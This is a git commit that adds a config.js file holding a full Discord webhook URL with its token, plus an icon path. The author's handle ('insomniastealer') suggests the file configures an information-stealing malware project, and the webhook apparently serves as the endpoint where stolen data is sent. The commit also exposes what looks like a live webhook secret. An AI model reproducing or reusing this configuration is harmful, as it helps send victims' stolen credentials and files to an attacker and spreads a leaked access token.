5930139e08877bf3d9c032e103703e2ac830c918
Insomania <139671564+insomniastealer@users.noreply.github.com>
2023-07-16 08:07:33 +0100

    webhook config

---
+++ config.js
@@ -0,0 +1,6 @@
+module.exports = () => {
+    return {
+        webhook_url: "https://discordapp.com/api/webhooks/1129988300665532437/zyVxOxkIKr8remAz59-0Z4Wnc_7C--VFLDuWNlsi4xH4ZV7LQjUmOmgEXvSg8utWEqBv",
+        icon: './default.ico',
+    }
+}
